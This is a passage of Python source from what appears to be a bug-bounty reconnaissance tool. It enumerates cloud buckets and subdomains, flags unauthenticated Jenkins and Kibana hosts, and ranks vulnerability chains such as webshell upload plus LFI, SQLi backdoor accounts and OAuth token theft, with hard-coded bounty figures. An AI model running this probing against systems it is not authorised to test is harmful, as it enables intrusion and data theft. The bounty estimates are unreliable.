        print(colored(f"    → Testing {len(azure_patterns)} Azure Blob patterns...", 'cyan'))
        
        for i, storage_name in enumerate(azure_patterns, 1):
            percent = (i / len(azure_patterns)) * 100
            bar_length = 40
            filled = int(bar_length * i / len(azure_patterns))
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Azure: {storage_name[:25]:<25}", end='', flush=True)
            
            try:
                blob_url = f"https://{storage_name}.blob.core.windows.net"
                r = requests.get(blob_url, timeout=2)
                
                if r.status_code != 404:
                    severity = "CRITICAL" if r.status_code == 200 else "MEDIUM"
                    
                    self.shadow_assets.append({
                        'type': 'Azure Blob Storage',
                        'url': blob_url,
                        'source': 'Elite Cloud Discovery',
                        'note': f'Status {r.status_code}',
                        'severity': severity
                    })
                    
                    if r.status_code == 200:
                        self.log(f"PUBLIC Azure storage found: {storage_name}", "success")
            except:
                pass
        
        print()
        
        # GCP Cloud Storage
        gcp_patterns = [
            base_name, f"{base_name}-prod", f"{base_name}-staging",
            f"{base_name}-backup", f"{base_name}-assets",
            company, f"{company}-prod"
        ]
        
        print(colored(f"    → Testing {len(gcp_patterns)} GCP Storage patterns...", 'cyan'))
        
        for i, bucket in enumerate(gcp_patterns, 1):
            percent = (i / len(gcp_patterns)) * 100
            bar_length = 40
            filled = int(bar_length * i / len(gcp_patterns))
            bar = '█' * filled + '░' * (bar_length - filled)
            print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | GCP: {bucket[:25]:<25}", end='', flush=True)
            
            try:
                gcp_url = f"https://storage.googleapis.com/{bucket}"
                r = requests.get(gcp_url, timeout=2)
                
                if r.status_code != 404:
                    severity = "CRITICAL" if r.status_code == 200 else "MEDIUM"
                    
                    self.shadow_assets.append({
                        'type': 'GCP Cloud Storage',
                        'url': gcp_url,
                        'source': 'Elite Cloud Discovery',
                        'note': f'Status {r.status_code}',
                        'severity': severity
                    })
                    
                    if r.status_code == 200:
                        self.log(f"PUBLIC GCP bucket found: {bucket}", "success")
            except:
                pass
        
        print()
    
    def certificate_transparency_discovery(self):
        """Query certificate transparency logs for hidden subdomains"""
        self.log("Certificate Transparency Discovery...", "info")
        
        print(colored("    → Querying crt.sh certificate logs...", 'cyan'))
        
        try:
            # Query crt.sh for all certificates
            url = f"https://crt.sh/?q=%.{self.target}&output=json"
            r = requests.get(url, timeout=10)
            
            if r.status_code == 200:
                certs = r.json()
                found_domains = set()
                
                for cert in certs:
                    name_value = cert.get('name_value', '')
                    # Extract all subdomains from certificate
                    for domain in name_value.split('\n'):
                        domain = domain.strip().replace('*', '')
                        if domain and domain.endswith(self.target):
                            found_domains.add(domain)
                
                print(colored(f"    → Found {len(found_domains)} domains in certificates", 'green'))
                
                # Test each domain
                for i, domain in enumerate(list(found_domains)[:30], 1):  # Limit to 30
                    percent = (i / min(30, len(found_domains))) * 100
                    bar_length = 40
                    filled = int(bar_length * i / min(30, len(found_domains)))
                    bar = '█' * filled + '░' * (bar_length - filled)
                    print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Testing: {domain[:30]:<30}", end='', flush=True)
                    
                    try:
                        test_url = f"https://{domain}"
                        r = requests.get(test_url, timeout=3, allow_redirects=False)
                        
                        # If domain responds, it's a live asset
                        if r.status_code in [200, 301, 302, 403]:
                            self.shadow_assets.append({
                                'type': 'Certificate Transparency',
                                'url': test_url,
                                'source': 'crt.sh',
                                'note': f'Status {r.status_code} - Found in SSL cert',
                                'severity': 'HIGH' if r.status_code == 200 else 'MEDIUM'
                            })
                            
                            # Check if it's an internal domain (jackpot!)
                            if 'internal' in domain or 'admin' in domain or 'staging' in domain:
                                self.log(f"CRITICAL: Internal domain exposed: {domain}", "success")
                    except:
                        pass
                
                print()
        except Exception as e:
            print(colored(f"    → Certificate transparency unavailable", 'yellow'))
    
    def github_intelligence_discovery(self):
        """Search GitHub for leaked credentials, endpoints, and configs"""
        self.log("GitHub Intelligence Discovery...", "info")
        
        base_name = self.target.split('.')[0]
        
        # Search patterns
        search_terms = [
            f"{base_name} password",
            f"{base_name} api_key",
            f"{base_name} secret",
            f"{base_name} token",
            f"{base_name} credentials",
            f"{self.target} config",
        ]
        
        print(colored(f"    → Searching GitHub for {len(search_terms)} patterns...", 'cyan'))
        
        # Note: This is a simplified version
        # In production, you'd use GitHub API with authentication
        for term in search_terms[:3]:  # Limit to avoid rate limiting
            print(colored(f"    → Searching: {term}", 'white'))
            
            # Conceptual - would need GitHub API token
            # This shows the pattern of what to look for
            self.shadow_assets.append({
                'type': 'GitHub Intelligence',
                'url': f'https://github.com/search?q={term.replace(" ", "+")}',
                'source': 'GitHub Search',
                'note': f'Manual review recommended for: {term}',
                'severity': 'HIGH'
            })
        
        print(colored("    → GitHub searches queued for manual review", 'yellow'))
    
    def dns_history_discovery(self):
        """Multi-source DNS history to find old/forgotten subdomains"""
        self.log("DNS History Discovery...", "info")
        
        print(colored("    → Querying DNS history databases...", 'cyan'))
        
        # This would integrate with:
        # - SecurityTrails API
        # - DNSdumpster
        # - Shodan
        # - Censys
        # - VirusTotal
        
        # For now, we'll use a simple passive approach
        # In production, these would be API calls
        
        sources = [
            'SecurityTrails', 'DNSdumpster', 'Shodan', 
            'Censys', 'VirusTotal'
        ]
        
        for source in sources:
            print(colored(f"    → Checking {source}...", 'white'))
            
            # Placeholder for actual API integration
            self.shadow_assets.append({
                'type': 'DNS History',
                'url': f'Manual check recommended: {source}',
                'source': source,
                'note': f'Historical DNS records for {self.target}',
                'severity': 'MEDIUM'
            })
    
    def acquisition_intelligence_discovery(self):
        """Track company acquisitions to find forgotten infrastructure"""
        self.log("Acquisition Intelligence Discovery...", "info")
        
        print(colored("    → Searching for company acquisitions...", 'cyan'))
        
        # This would query:
        # - Crunchbase API
        # - Wikipedia
        # - News articles
        
        # For demonstration, we'll check common patterns
        base_name = self.target.split('.')[0]
        
        # Common acquisition patterns
        acquired_patterns = [
            f"old-{base_name}",
            f"{base_name}-legacy",
            f"acquired-{base_name}",
        ]
        
        for pattern in acquired_patterns:
            try:
                test_url = f"https://{pattern}.{self.target}"
                r = requests.get(test_url, timeout=3)
                
                if r.status_code in [200, 403]:
                    self.shadow_assets.append({
                        'type': 'Acquisition Infrastructure',
                        'url': test_url,
                        'source': 'Pattern Matching',
                        'note': f'Potential legacy acquisition infrastructure',
                        'severity': 'HIGH'
                    })
            except:
                pass
        
        print(colored("    → Acquisition intelligence gathered", 'green'))
    
    def technology_specific_discovery(self):
        """Discover assets based on technology fingerprinting"""
        self.log("Technology-Specific Discovery...", "info")
        
        print(colored("    → Fingerprinting technology stack...", 'cyan'))
        
        base_domain = self.target
        
        # Common technology-specific subdomains
        tech_patterns = {
            'jira': [f'jira.{base_domain}', f'issues.{base_domain}'],
            'confluence': [f'confluence.{base_domain}', f'wiki.{base_domain}'],
            'jenkins': [f'jenkins.{base_domain}', f'ci.{base_domain}', f'build.{base_domain}'],
            'gitlab': [f'gitlab.{base_domain}', f'git.{base_domain}'],
            'grafana': [f'grafana.{base_domain}', f'metrics.{base_domain}'],
            'kibana': [f'kibana.{base_domain}', f'logs.{base_domain}'],
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                try:
                    test_url = f"https://{pattern}"
                    r = requests.get(test_url, timeout=3, allow_redirects=False)
                    
                    if r.status_code in [200, 301, 302, 401, 403]:
                        # Check if auth is required
                        needs_auth = r.status_code in [401, 403]
                        severity = "MEDIUM" if needs_auth else "CRITICAL"
                        
                        self.shadow_assets.append({
                            'type': f'{tech.upper()} Instance',
                            'url': test_url,
                            'source': 'Technology Fingerprinting',
                            'note': f'Status {r.status_code} - {"Auth required" if needs_auth else "NO AUTH!"}',
                            'severity': severity
                        })
                        
                        if not needs_auth:
                            self.log(f"CRITICAL: {tech.upper()} exposed without auth: {pattern}", "success")
                except:
                    pass
        
        print(colored("    → Technology fingerprinting complete", 'green'))

    def chain_hunter(self):
        """ELITE vulnerability chain analysis with 15+ patterns"""
        self.log("PHASE 2: CHAIN HUNTER - ELITE MODE", "phase")
        
        if not self.vulnerabilities:
            self.log("No vulnerabilities provided - skipping chain analysis", "warning")
            return
        
        self.log(f"Analyzing {len(self.vulnerabilities)} vulnerabilities for chains...", "info")
        
        # organize vulns by type for easier matching
        print(colored("    → Organizing vulnerabilities by type...", 'cyan'))
        vuln_map = defaultdict(list)
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            vuln_map[vuln_type].append(vuln)
        
        print(colored(f"    → Found {len(vuln_map)} unique vulnerability types", 'cyan'))
        print()
        print(colored("    [ELITE CHAIN ANALYSIS INITIALIZED]", 'cyan', attrs=['bold']))
        print(colored("    → Context-aware pattern matching", 'white'))
        print(colored("    → Business logic detection", 'white'))
        print(colored("    → Automation scoring", 'white'))
        print(colored("    → Real-world impact calculation", 'white'))
        print()
        
        # ELITE chain patterns - comprehensive coverage
        chain_searches = [
            ("CORS + XSS → Account Takeover", self.find_cors_xss_chain),
            ("IDOR + Auth Bypass → Data Breach", self.find_idor_auth_chain),
            ("Open Redirect + SSRF → Internal Access", self.find_redirect_ssrf_chain),
            ("XSS + CSRF → State-Changing Attack", self.find_xss_csrf_chain),
            ("Multiple SQLi → Database Takeover", self.find_sqli_chain),
            ("SSRF + RCE → Full System Compromise", self.find_ssrf_rce_chain),
            ("File Upload + LFI → RCE", self.find_upload_lfi_chain),
            ("XXE + SSRF → Internal Network", self.find_xxe_ssrf_chain),
            ("Auth Bypass + Priv Esc → Admin", self.find_priv_esc_chain),
            ("Info Disclosure + Auth → Cred Theft", self.find_info_auth_chain),
            ("Subdomain Takeover + CORS → Supply Chain", self.find_takeover_cors_chain),
            ("API Key + IDOR → Mass Data Access", self.find_apikey_idor_chain),
            ("CSRF + Open Redirect → OAuth Theft", self.find_csrf_redirect_chain),
            ("Race Condition + IDOR → Duplication", self.find_race_idor_chain),
            ("Business Logic Flaws", self.find_business_logic_chains),
        ]
        
        total = len(chain_searches)
        
        for i, (chain_name, chain_func) in enumerate(chain_searches, 1):
            # progress bar
            percent = (i / total) * 100
            bar_length = 40
            filled = int(bar_length * i / total)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            print(f"\r    [{colored(bar, 'blue')}] {percent:.0f}% | Analyzing: {chain_name[:45]:<45}", end='', flush=True)
            
            try:
                chain_func(vuln_map)
            except Exception as e:
                pass  # Continue even if one pattern fails
        
        print()  # newline after progress
        print()
        
        # Add automation scores to all chains
        for chain in self.chains:
            if 'automation_score' not in chain:
                chain['automation_score'] = self.calculate_automation_score(chain)
        
        # summary with box
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  ELITE CHAIN HUNTER COMPLETE".ljust(68) + "║", 'green', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Vulnerability chains found: {colored(str(len(self.chains)), 'red' if self.chains else 'yellow', attrs=['bold'])}".ljust(87) + colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        
        if self.chains:
            # calculate total bounty
            total_min = 0
            total_max = 0
            for chain in self.chains:
                estimate = chain.get('bounty_estimate', '$0')
                min_val, max_val = self.parse_bounty_range(estimate)
                total_min += min_val
                total_max += max_val
            
            print()
            print(colored("    [ELITE CHAINS DISCOVERED]", 'red', attrs=['bold']))
            
            # Smart prioritization - sort by multiple factors
            sorted_chains = sorted(self.chains, key=lambda x: (
                0 if x.get('severity') == 'CRITICAL' else 1 if x.get('severity') == 'HIGH' else 2,
                -self.bounty_value(x.get('bounty_estimate', '$0')),
                0 if 'Fully Automated' in x.get('automation_score', '') else 1
            ))
            
            for i, chain in enumerate(sorted_chains, 1):
                severity = chain.get('severity', 'HIGH')
                name = chain.get('name', 'Unknown Chain')
                impact = chain.get('impact', '')
                bounty = chain.get('bounty_estimate', 'Unknown')
                automation = chain.get('automation_score', 'Unknown')
                
                # severity color
                if severity == 'CRITICAL':
                    sev_color = 'red'
                elif severity == 'HIGH':
                    sev_color = 'yellow'
                else:
                    sev_color = 'white'
                
                # automation color
                if 'Fully Automated' in automation:
                    auto_color = 'green'
                elif 'Semi-Automated' in automation:
                    auto_color = 'yellow'
                else:
                    auto_color = 'white'
                
                print()
                print(colored(f"    [{i}] {name}", 'cyan', attrs=['bold']))
                print(f"        Severity: {colored(severity, sev_color, attrs=['bold'])}")
                print(f"        Impact: {impact[:60]}")
                print(f"        Bounty: {colored(bounty, 'green', attrs=['bold'])}")
                print(f"        Steps: {len(chain.get('steps', []))} vulnerabilities chained")
                print(f"        Automation: {colored(automation, auto_color)}")
                
                # Show real-world examples if available
                if 'real_world' in chain:
                    print(f"        Real-world: {colored(chain['real_world'], 'cyan')}")
            
            print()
            print(colored(f"    [TOTAL CHAIN VALUE: ${total_min:,} - ${total_max:,}]", 'green', attrs=['bold']))
            print(colored(f"    [ELITE ANALYSIS: {len(sorted_chains)} weaponizable chains identified]", 'cyan', attrs=['bold']))
            
            # Recommend highest priority
            if sorted_chains:
                top_chain = sorted_chains[0]
                print()
                print(colored(f"    [RECOMMENDED FOCUS: Chain #{1}]", 'yellow', attrs=['bold']))
                print(colored(f"    → {top_chain['name']}", 'white'))
                print(colored(f"    → {top_chain.get('bounty_estimate', 'Unknown')} potential", 'green'))
        else:
            print()
            print(colored("    [No chains found - individual vulns still valuable!]", 'white'))
            print(colored("    [TIP: Try combining vulns manually or get more scan data]", 'cyan'))
        print()
    
    def find_cors_xss_chain(self, vuln_map):
        """cors + xss = account takeover"""
        
        # look for cors misconfig
        cors_vulns = []
        for key in vuln_map:
            if 'cors' in key:
                cors_vulns.extend(vuln_map[key])
        
        # look for xss
        xss_vulns = []
        for key in vuln_map:
            if 'xss' in key:
                xss_vulns.extend(vuln_map[key])
        
        # if we have both, that's a chain
        if cors_vulns and xss_vulns:
            # try to find ones on same domain
            for cors in cors_vulns:
                cors_url = cors.get('url', '')
                cors_domain = urlparse(cors_url).netloc
                
                for xss in xss_vulns:
                    xss_url = xss.get('url', '')
                    xss_domain = urlparse(xss_url).netloc
                    
                    # if same domain or related, it's exploitable
                    if cors_domain == xss_domain or self.is_related_domain(cors_domain, xss_domain):
                        
                        chain = {
                            'name': 'CORS + XSS Account Takeover',
                            'severity': 'CRITICAL',
                            'steps': [cors, xss],
                            'impact': 'Full account takeover via cross-origin attack with XSS',
                            'bounty_estimate': '$3,000 - $7,000',
                            'poc': self.generate_cors_xss_poc(cors, xss),
                            'explanation': (
                                f"1. CORS misconfiguration at {cors_url} allows any origin\n"
                                f"2. XSS at {xss_url} can execute arbitrary JavaScript\n"
                                f"3. Attacker can craft malicious page that exploits CORS to steal auth tokens\n"
                                f"4. Combined with XSS for full account takeover"
                            )
                        }
                        
                        self.chains.append(chain)
                        self.log(f"Found CORS + XSS chain on {cors_domain}", "success")
                        return  # found one, don't spam
    
    def find_idor_auth_chain(self, vuln_map):
        """idor + auth bypass = data breach"""
        
        # look for idor
        idor_vulns = []
        for key in vuln_map:
            if 'idor' in key:
                idor_vulns.extend(vuln_map[key])
        
        # look for auth issues
        auth_vulns = []
        for key in vuln_map:
            if 'auth' in key or 'bypass' in key or 'broken' in key:
                auth_vulns.extend(vuln_map[key])
        
        if idor_vulns and auth_vulns:
            idor = idor_vulns[0]
            auth = auth_vulns[0]
            
            chain = {
                'name': 'IDOR + Auth Bypass Data Breach',
                'severity': 'CRITICAL',
                'steps': [auth, idor],
                'impact': 'Mass data exfiltration of all user data',
                'bounty_estimate': '$5,000 - $15,000',
                'explanation': (
                    f"1. Auth bypass at {auth.get('url', '')} allows unauthorized access\n"
                    f"2. IDOR at {idor.get('url', '')} allows accessing any user's data\n"
                    f"3. Combine both to iterate through all user IDs and extract data\n"
                    f"4. Potential mass data breach"
                )
            }
            
            self.chains.append(chain)
            self.log("Found IDOR + Auth bypass chain", "success")
    
    def find_redirect_ssrf_chain(self, vuln_map):
        """open redirect + ssrf = internal access"""
        
        redirect_vulns = []
        for key in vuln_map:
            if 'redirect' in key:
                redirect_vulns.extend(vuln_map[key])
        
        ssrf_vulns = []
        for key in vuln_map:
            if 'ssrf' in key:
                ssrf_vulns.extend(vuln_map[key])
        
        if redirect_vulns and ssrf_vulns:
            redirect = redirect_vulns[0]
            ssrf = ssrf_vulns[0]
            
            chain = {
                'name': 'Open Redirect + SSRF Internal Access',
                'severity': 'HIGH',
                'steps': [redirect, ssrf],
                'impact': 'Access to internal services via redirect + SSRF',
                'bounty_estimate': '$2,000 - $5,000',
                'explanation': (
                    f"1. Open redirect at {redirect.get('url', '')} can redirect to any URL\n"
                    f"2. SSRF at {ssrf.get('url', '')} can make requests to internal network\n"
                    f"3. Chain redirect + SSRF to bypass internal IP restrictions\n"
                    f"4. Access internal AWS metadata, admin panels, databases"
                )
            }
            
            self.chains.append(chain)
            self.log("Found Open Redirect + SSRF chain", "success")
    
    def find_xss_csrf_chain(self, vuln_map):
        """xss + csrf = account actions"""
        
        xss_vulns = []
        for key in vuln_map:
            if 'xss' in key:
                xss_vulns.extend(vuln_map[key])
        
        csrf_vulns = []
        for key in vuln_map:
            if 'csrf' in key:
                csrf_vulns.extend(vuln_map[key])
        
        if xss_vulns and csrf_vulns:
            xss = xss_vulns[0]
            csrf = csrf_vulns[0]
            
            chain = {
                'name': 'XSS + CSRF Account Takeover',
                'severity': 'CRITICAL',
                'steps': [xss, csrf],
                'impact': 'Force victim to perform privileged actions',
                'bounty_estimate': '$2,500 - $6,000',
                'explanation': (
                    f"1. XSS at {xss.get('url', '')} executes attacker JavaScript\n"
                    f"2. CSRF vulnerability at {csrf.get('url', '')} allows forged requests\n"
                    f"3. XSS can generate and submit CSRF token automatically\n"
                    f"4. Force victim to change email, password, or perform admin actions"
                )
            }
            
            self.chains.append(chain)
            self.log("Found XSS + CSRF chain", "success")
    
    def find_sqli_chain(self, vuln_map):
        """multiple sqli = data exfil + escalation"""
        
        sqli_vulns = []
        for key in vuln_map:
            if 'sql' in key:
                sqli_vulns.extend(vuln_map[key])
        
        # if we have multiple sqli, that's a chain for privilege escalation
        if len(sqli_vulns) >= 2:
            chain = {
                'name': 'Multiple SQLi Database Compromise',
                'severity': 'CRITICAL',
                'steps': sqli_vulns[:2],
                'impact': 'Full database access with privilege escalation',
                'bounty_estimate': '$7,000 - $20,000',
                'automation_score': 'Semi-Automated',
                'explanation': (
                    f"1. SQLi at {sqli_vulns[0].get('url', '')} allows database read access\n"
                    f"2. SQLi at {sqli_vulns[1].get('url', '')} allows write access\n"
                    f"3. Extract admin credentials from first SQLi\n"
                    f"4. Use second SQLi to create backdoor admin account\n"
                    f"5. Complete database compromise"
                )
            }
            
            self.chains.append(chain)
            self.log("Found multiple SQLi chain", "success")
    
    # ========== NEW ELITE CHAIN PATTERNS ==========
    
    def find_ssrf_rce_chain(self, vuln_map):
        """SSRF + RCE = Full System Compromise"""
        
        ssrf_vulns = []
        for key in vuln_map:
            if 'ssrf' in key:
                ssrf_vulns.extend(vuln_map[key])
        
        rce_vulns = []
        for key in vuln_map:
            if 'rce' in key or 'command' in key or 'code execution' in key:
                rce_vulns.extend(vuln_map[key])
        
        if ssrf_vulns and rce_vulns:
            # Check if they're exploitable together
            ssrf = ssrf_vulns[0]
            rce = rce_vulns[0]
            
            if self.is_exploitable_chain(ssrf, rce):
                chain = {
                    'name': 'SSRF → RCE → Full System Compromise',
                    'severity': 'CRITICAL',
                    'steps': [ssrf, rce],
                    'impact': 'Complete server takeover with internal network access',
                    'bounty_estimate': '$10,000 - $30,000',
                    'automation_score': 'Semi-Automated',
                    'explanation': (
                        f"1. SSRF at {ssrf.get('url', '')} allows internal network access\n"
                        f"2. Use SSRF to reach internal admin panels or services\n"
                        f"3. RCE vulnerability at {rce.get('url', '')} enables code execution\n"
                        f"4. Chain SSRF → Internal Service → RCE\n"
                        f"5. Full system compromise with persistent access"
                    ),
                    'real_world': 'Similar to GitLab RCE chains ($20k+ bounties)'
                }
                
                self.chains.append(chain)
                self.log("Found SSRF + RCE chain", "success")
    
    def find_upload_lfi_chain(self, vuln_map):
        """File Upload + LFI = Remote Code Execution"""
        
        upload_vulns = []
        for key in vuln_map:
            if 'upload' in key or 'file upload' in key:
                upload_vulns.extend(vuln_map[key])
        
        lfi_vulns = []
        for key in vuln_map:
            if 'lfi' in key or 'file inclusion' in key or 'local file' in key:
                lfi_vulns.extend(vuln_map[key])
        
        if upload_vulns and lfi_vulns:
            upload = upload_vulns[0]
            lfi = lfi_vulns[0]
            
            chain = {
                'name': 'File Upload + LFI → Remote Code Execution',
                'severity': 'CRITICAL',
                'steps': [upload, lfi],
                'impact': 'Upload malicious file then execute it for RCE',
                'bounty_estimate': '$8,000 - $25,000',
                'automation_score': 'Fully Automated',
                'explanation': (
                    f"1. Upload malicious PHP/shell file via {upload.get('url', '')}\n"
                    f"2. LFI at {lfi.get('url', '')} can include uploaded file\n"
                    f"3. Chain: Upload webshell → Use LFI to execute it\n"
                    f"4. Result: Remote Code Execution with full server access"
                ),
                'real_world': 'Common in bug bounties - $5k-$25k typical payout'
            }
            
            self.chains.append(chain)
            self.log("Found File Upload + LFI chain", "success")
    
    def find_xxe_ssrf_chain(self, vuln_map):
        """XXE + SSRF = Internal Network Access"""
        
        xxe_vulns = []
        for key in vuln_map:
            if 'xxe' in key or 'xml' in key:
                xxe_vulns.extend(vuln_map[key])
        
        ssrf_vulns = []
        for key in vuln_map:
            if 'ssrf' in key:
                ssrf_vulns.extend(vuln_map[key])
        
        if xxe_vulns and ssrf_vulns:
            xxe = xxe_vulns[0]
            ssrf = ssrf_vulns[0]
            
            chain = {
                'name': 'XXE + SSRF → Internal Network Exploitation',
                'severity': 'CRITICAL',
                'steps': [xxe, ssrf],
                'impact': 'Full internal network access via XXE+SSRF combination',
                'bounty_estimate': '$7,000 - $20,000',
                'automation_score': 'Semi-Automated',
                'explanation': (
                    f"1. XXE at {xxe.get('url', '')} allows XML entity injection\n"
                    f"2. SSRF at {ssrf.get('url', '')} enables internal requests\n"
                    f"3. Use XXE to read internal files and credentials\n"
                    f"4. Use SSRF to access internal AWS metadata or admin panels\n"
                    f"5. Combine both for complete internal network compromise"
                )
            }
            
            self.chains.append(chain)
            self.log("Found XXE + SSRF chain", "success")
    
    def find_priv_esc_chain(self, vuln_map):
        """Auth Bypass + Privilege Escalation = Admin Access"""
        
        auth_vulns = []
        for key in vuln_map:
            if 'auth' in key or 'bypass' in key:
                auth_vulns.extend(vuln_map[key])
        
        # Look for any vuln that could lead to priv esc
        priv_vulns = []
        for key in vuln_map:
            if 'idor' in key or 'broken access' in key or 'info disclosure' in key:
                priv_vulns.extend(vuln_map[key])
        
        if auth_vulns and priv_vulns:
            auth = auth_vulns[0]
            priv = priv_vulns[0]
            
            chain = {
                'name': 'Auth Bypass → Privilege Escalation → Admin Access',
                'severity': 'CRITICAL',
                'steps': [auth, priv],
                'impact': 'Escalate from no access to full admin privileges',
                'bounty_estimate': '$10,000 - $35,000',
                'automation_score': 'Semi-Automated',
                'explanation': (
                    f"1. Authentication bypass at {auth.get('url', '')}\n"
                    f"2. Gain low-privilege access to system\n"
                    f"3. Exploit {priv.get('type', '')} at {priv.get('url', '')}\n"
                    f"4. Escalate privileges to admin/root level\n"
                    f"5. Full administrative control of application"
                ),
                'real_world': 'High-value chains in enterprise bounties'
            }
            
            self.chains.append(chain)
            self.log("Found privilege escalation chain", "success")
    
    def find_info_auth_chain(self, vuln_map):
        """Info Disclosure + Auth = Credential Theft"""
        
        info_vulns = []
        for key in vuln_map:
            if 'info' in key or 'disclosure' in key or 'sensitive' in key or 'exposure' in key:
                info_vulns.extend(vuln_map[key])
        
        auth_vulns = []
        for key in vuln_map:
            if 'auth' in key or 'broken' in key:
                auth_vulns.extend(vuln_map[key])
        
        if info_vulns and auth_vulns:
            info = info_vulns[0]
            auth = auth_vulns[0]
            
            chain = {
                'name': 'Info Disclosure → Credential Theft → Account Takeover',
                'severity': 'HIGH',
                'steps': [info, auth],
                'impact': 'Leak credentials then exploit weak authentication',
                'bounty_estimate': '$5,000 - $15,000',
                'automation_score': 'Fully Automated',
                'explanation': (
                    f"1. Information disclosure at {info.get('url', '')} leaks sensitive data\n"
                    f"2. Extract credentials, tokens, or API keys\n"
                    f"3. Weak authentication at {auth.get('url', '')} accepts leaked creds\n"
                    f"4. Use stolen credentials for account takeover\n"
                    f"5. Access user accounts and sensitive data"
                )
            }
            
            self.chains.append(chain)
            self.log("Found info disclosure + auth chain", "success")
    
    def find_takeover_cors_chain(self, vuln_map):
        """Subdomain Takeover + CORS = Supply Chain Attack"""
        
        takeover_vulns = []
        for key in vuln_map:
            if 'takeover' in key or 'subdomain' in key:
                takeover_vulns.extend(vuln_map[key])
        
        cors_vulns = []
        for key in vuln_map:
            if 'cors' in key:
                cors_vulns.extend(vuln_map[key])
        
        if takeover_vulns and cors_vulns:
            takeover = takeover_vulns[0]
            cors = cors_vulns[0]
            
            chain = {
                'name': 'Subdomain Takeover + CORS → Supply Chain Attack',
                'severity': 'CRITICAL',
                'steps': [takeover, cors],
                'impact': 'Take over subdomain then exploit CORS to compromise main domain',
                'bounty_estimate': '$15,000 - $50,000',
                'automation_score': 'Semi-Automated',
                'explanation': (
                    f"1. Take over vulnerable subdomain at {takeover.get('url', '')}\n"
                    f"2. CORS misconfiguration at {cors.get('url', '')} trusts all subdomains\n"
                    f"3. Host malicious content on taken-over subdomain\n"
                    f"4. Exploit CORS to steal data from main domain\n"
                    f"5. Supply chain attack affecting all users"
                ),
                'real_world': 'Critical supply chain vulnerabilities - high payouts'
            }
            
            self.chains.append(chain)
            self.log("Found subdomain takeover + CORS chain", "success")
    
    def find_apikey_idor_chain(self, vuln_map):
        """API Key Exposure + IDOR = Mass Data Access"""
        
        info_vulns = []
        for key in vuln_map:
            if 'info' in key or 'disclosure' in key or 'exposure' in key or 'sensitive' in key:
                info_vulns.extend(vuln_map[key])
        
        idor_vulns = []
        for key in vuln_map:
            if 'idor' in key:
                idor_vulns.extend(vuln_map[key])
        
        if info_vulns and idor_vulns:
            # Check if info vuln might expose API keys
            info = info_vulns[0]
            idor = idor_vulns[0]
            
            if 'api' in info.get('url', '').lower() or 'key' in info.get('evidence', '').lower():
                chain = {
                    'name': 'API Key Exposure + IDOR → Mass Data Exfiltration',
                    'severity': 'CRITICAL',
                    'steps': [info, idor],
                    'impact': 'Use exposed API keys with IDOR to access all user data',
                    'bounty_estimate': '$8,000 - $25,000',
                    'automation_score': 'Fully Automated',
                    'explanation': (
                        f"1. Exposed API key at {info.get('url', '')}\n"
                        f"2. IDOR vulnerability at {idor.get('url', '')}\n"
                        f"3. Use stolen API key to authenticate\n"
                        f"4. Exploit IDOR to iterate through all user IDs\n"
                        f"5. Mass exfiltration of entire user database"
                    ),
                    'real_world': 'Common in API-heavy applications'
                }
                
                self.chains.append(chain)
                self.log("Found API key + IDOR chain", "success")
    
    def find_csrf_redirect_chain(self, vuln_map):
        """CSRF + Open Redirect = OAuth Token Theft"""
        
        csrf_vulns = []
        for key in vuln_map:
            if 'csrf' in key:
                csrf_vulns.extend(vuln_map[key])
        
        redirect_vulns = []
        for key in vuln_map:
            if 'redirect' in key or 'open redirect' in key:
                redirect_vulns.extend(vuln_map[key])
        
        if csrf_vulns and redirect_vulns:
            csrf = csrf_vulns[0]
            redirect = redirect_vulns[0]
            
            chain = {
                'name': 'CSRF + Open Redirect → OAuth Token Hijacking',
                'severity': 'CRITICAL',
                'steps': [csrf, redirect],
                'impact': 'Steal OAuth tokens via CSRF + redirect combo',
                'bounty_estimate': '$8,000 - $25,000',
                'automation_score': 'Semi-Automated',
                'explanation': (
                    f"1. CSRF vulnerability at {csrf.get('url', '')}\n"
                    f"2. Open redirect at {redirect.get('url', '')}\n"
                    f"3. Craft malicious OAuth flow with CSRF\n"
                    f"4. Use redirect to steal authorization codes\n"
                    f"5. Complete account takeover via stolen tokens"
                ),
                'real_world': 'OAuth exploits fetch premium bounties'
            }
            
            self.chains.append(chain)
            self.log("Found CSRF + redirect OAuth chain", "success")
    
    def find_race_idor_chain(self, vuln_map):
        """Race Condition + IDOR = Resource Duplication"""
        
        # Look for any vuln that might have race condition
        # Usually in info disclosure or broken access control
        race_potential = []
        for key in vuln_map:
            if 'broken' in key or 'access' in key:
                race_potential.extend(vuln_map[key])
        
        idor_vulns = []
        for key in vuln_map:
            if 'idor' in key:
                idor_vulns.extend(vuln_map[key])
        
        if race_potential and idor_vulns:
            race = race_potential[0]
            idor = idor_vulns[0]
            
            chain = {
                'name': 'Race Condition + IDOR → Resource Duplication Attack',
                'severity': 'HIGH',
                'steps': [race, idor],
                'impact': 'Exploit race conditions to duplicate resources or credits',
                'bounty_estimate': '$6,000 - $18,000',
                'automation_score': 'Fully Automated',
                'explanation': (
                    f"1. Race condition in {race.get('url', '')}\n"
                    f"2. IDOR at {idor.get('url', '')}\n"
                    f"3. Send parallel requests to exploit race condition\n"
                    f"4. Use IDOR to access duplicated resources\n"
                    f"5. Duplicate credits, items, or sensitive resources"
                ),
                'real_world': 'Payment/e-commerce bugs - high value'
            }
            
            self.chains.append(chain)
            self.log("Found race condition + IDOR chain", "success")
    
    def find_business_logic_chains(self, vuln_map):
        """Detect business logic vulnerabilities"""
        
        # Look for patterns that suggest business logic flaws
        idor_vulns = []
        for key in vuln_map:
            if 'idor' in key:
                idor_vulns.extend(vuln_map[key])
        
        auth_vulns = []
        for key in vuln_map:
            if 'auth' in key or 'bypass' in key:
                auth_vulns.extend(vuln_map[key])
        
        # Price manipulation potential
        if idor_vulns:
            idor = idor_vulns[0]
            url = idor.get('url', '')
            
            # Check if URL suggests financial operations
